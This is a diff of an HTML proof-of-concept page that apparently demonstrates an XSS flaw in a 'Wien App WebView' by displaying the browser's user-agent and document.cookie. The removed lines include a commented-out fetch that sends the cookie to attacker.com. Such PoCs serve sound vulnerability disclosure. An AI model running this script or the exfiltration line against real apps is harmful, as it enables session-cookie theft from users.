@@ -7,26 +7,30 @@
 <body>
     <h1>XSS Vulnerability Confirmed</h1>
     <p>This page was loaded in the Wien App WebView without proper validation.</p>
-    
+
+    <h2>Browser / WebView Information</h2>
+    <p><strong>User-Agent:</strong></p>
+    <pre id="ua"></pre>
+
+    <h2>Cookie Information</h2>
+    <p><strong>document.cookie:</strong></p>
+    <pre id="cookie"></pre>
+
     <script>
         // Proof of JavaScript execution
-        alert('XSS Vulnerability Confirmed in Wien App WebView');
-        
-        // Demonstrate cookie access
-        var cookies = document.cookie;
-        if (cookies) {
-            alert('Cookies accessible: ' + cookies);
-        }
-        
-        // Log to console
         console.log('XSS PoC executed successfully');
-        console.log('User-Agent:', navigator.userAgent);
-        console.log('Cookies:', document.cookie);
-        
-        // Send proof to attacker server (optional)
-        // fetch('https://attacker.com/log?poc=success&cookie=' + encodeURIComponent(document.cookie));
+
+        // Display User-Agent
+        var ua = navigator.userAgent || 'N/A';
+        document.getElementById('ua').textContent = ua;
+        console.log('User-Agent:', ua);
+
+        // Display cookies
+        var cookies = document.cookie || '(no cookies available)';
+        document.getElementById('cookie').textContent = cookies;
+        console.log('Cookies:', cookies);
     </script>
-    
-    <p>If you see this alert, the XSS vulnerability is confirmed.</p>
+
+    <p>If you see the User-Agent and cookie values above, the XSS vulnerability is confirmed.</p>
 </body>
 </html>
